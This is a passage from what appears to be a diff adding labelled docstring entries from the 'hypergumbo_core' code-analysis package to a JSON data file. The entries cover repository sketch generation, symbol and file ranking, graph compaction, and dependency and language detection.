``_select_additional_files`` chooses files README first, then\n    round-robin over README-linked files, 5W1H embedding-similarity rank\n    (when sentence-transformers is available) and symbol-mention-centrality\n    rank; already-chosen files skip ranking\n    (``_select_additional_files_preselected``)\n12. Source Files Content — full source for the top-ranked files\n    (only when ``with_source=True``)\n13. Additional Files Content — full source for additional files\n\nData source\n-----------\n``generate_sketch`` is a thin wrapper around ``_generate_sketch_impl``, which\nholds the section logic. Given no ``cached_results`` (``--input``), the\nwrapper loads the cached survey.json, and on a cold cache runs\n``run_behavior_map`` first and loads the map it wrote. Either way it then\ninstalls a synthetic ``FileIndex`` built from the map's node paths for the\nduration of the call, so test counting, language detection, source-file\ndiscovery and the Structure tree summarize the map's files instead of\nre-walking the working tree. The survey used to run inside\n``_generate_sketch_impl``, after the wrapper had already looked for a map and\nfound none, so a cold sketch re-walked the tree with no index at all: about a\nminute on this repository, all of it reported under the profile phase. A\n``CatalogueError`` propagates; other discovery errors fall back to direct\nprofile detection and analysis. Profile, symbols and edges come from the map,\nand its ``sketch_precomputed`` block, when present, supplies the README\ndescription, config info and additional-file centrality scores.\n\nBehavioral flags\n----------------\n- ``with_source`` — include sections 12-13 (full file content).\n- ``require_sections`` — force-include the named sections even when\n  the token budget is exhausted, and skip final truncation. It does not\n  raise; it overrides the budget gate (WI-nakam).\n- ``stats_out`` — a ``SketchStats`` to fill with representativeness\n  mass (per-section in-degree and confidence sums plus ``has_*`` flags,\n  against repo totals) for the \"How Representative Is This Sketch?\"\n  table.\n- ``config_extraction_mode`` — heuristic / embedding / hybrid config\n  extraction for section 6 (function default heuristic).\n- ``language_proportional`` (default True) — language-stratified\n  Phase-1 Key Symbols selection (avoids one language dominating on\n  polyglot repos).\n- ``--no-sketch-fan-out`` (``survey`` CLI, not ``sketch``) — skip the\n  ``<stem>.{4k,16k,64k}.json`` sketch-tier preview files written next\n  to ``--out`` (equivalent to ``--budgets none``). Per-handler slice\n  output is suppressed separately by ``--no-handler-slices``.\n\nToken budgeting uses a simple heuristic (~4 chars per token) which is\naccurate enough for approximate sizing. There is no exact-tokenizer\npath — the heuristic is the only counter.\n\nCentrality dampening\n--------------------\nSymbol ranking flows through ``compute_dampened_centrality``, which\napplies the pinned ``_CANONICAL_DAMPENERS`` stage stack — seven stages:\ntier, noise, utility, common_method, trivial_sink, generated, file_kind\n(Key Symbols skips file_kind, a no-op there since kind='file' symbols\nare pre-filtered).\n(The sibling-impl group weighting was removed by WI-karad.) The stack\norder is invariant — ``_CANONICAL_DAMPENERS`` is defined in\n``ranking.py`` and pinned by\n``tests/test_ranking.py::test_canonical_dampener_order_pinned``.\n\nWhy Progressive Expansion\n-------------------------\nRather than truncating, we progressively add content until\napproaching the token budget. This ensures the output uses available\ncontext space effectively while remaining coherent."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/ranking.py",
+   "text": "Rank files by importance using symbol density scoring.\n\nUses the same pipeline as rank_symbols(): edge filtering, hub saturation,\ntier weighting, and full dampening (noise, utility, common method name,\ntrivial sink) before computing file scores.\n\nArgs:\n    symbols: List of symbols to analyze.\n    edges: List of edges between symbols.\n    first_party_priority: If True, apply tier weighting. Default True.\n    top_k: Number of top symbols to sum for file score. Default 3.\n    exclude_test_edges: If True, ignore edges from test files. Default True.\n    exclude_import_edges: If True, ignore import edges. Default False\n        (weighted inclusion via edge_type_weights).\n    min_edge_confidence: Minimum edge confidence to include. Default 0.0.\n\nReturns:\n    List of RankedFile objects sorted by importance (highest first)."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/discovery.py",
+   "text": "Check if a directory name looks like a locale/language code.\n\nMatches ISO 639-1 two-letter codes (en, ja, fr) and extended tags\n(ja-jp, pt-br, zh-hans). Rejects common non-locale directory names\nlike 'api', 'guide', 'images'."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/compact.py",
+   "text": "Compute score for adding a node to the selected set.\n\nScore prioritizes:\n1. Largest component growth (bridges disconnected components)\n2. Edge count added (densifies the graph)\n3. Centrality (importance fallback)\n\nArgs:\n    node_id: Node to score.\n    selected_ids: Currently selected node IDs.\n    uf: Union-Find tracking components of selected nodes.\n    outgoing: Outgoing adjacency list.\n    incoming: Incoming adjacency list.\n    centrality: Centrality scores.\n\nReturns:\n    Tuple of (component_growth, edges_added, centrality) for sorting.\n    Higher is better for all three."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/linkers/graphql_sdl.py",
+   "text": "Mint schema symbols for every embedded SDL definition under ``root``.\n\nReturns ``(symbols, files_scanned, definitions_found)``. The definition\ncount is the pass's own candidate set — what its scan FOUND, which is what\n``silence_reason_for_candidates`` must be handed, rather than what it\nemitted."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/analyze/base.py",
+   "text": "Extract the plain name from a single decorator/annotation node.\n\nWalks the decorator's children to find the identifier.  Handles\nboth simple (``@foo``) and call (``@foo(arg)``) forms."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/python_stdlib_versions.py",
+   "text": "True when ``name``'s window covers ``version``. Names outside the table\nare not decided here; ask the interpreter's own list."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/profile.py",
+   "text": "Extract dep names from a requirements.txt-style file.\n\nStrips ``#`` comments, ignores ``-e`` / ``--editable`` / ``-r`` / ``-c``\noptions, and extracts the PEP 508 distribution name from each line."
+  },
+  {
+   "label": 0,
+   "kind": "docstring",
+   "origin": "hypergumbo_core/catalog.py",
+   "text": "Return the union of language tags across registered analyzers and linkers.\n\nSingle source of truth for \"what languages does this codebase know\nabout?\" — the answer is \"the union of ``languages=[...]`` kwargs on\nevery ``@register_analyzer`` / ``@register_linker`` call site.\" Used\nby the WI-busij multi-value-field-axis linter to resolve the\n``# axis: language`` annotation; not a hand-maintained list.\n\nBehaves as a lightweight axis declaration per ADR-0024 §4:\nno separate registry module, no ``AXIS_*`` constants, no\n``*Spec`` dataclass — just a function that returns the legal\nset, derived from data we already have."
   }
  ]
 }
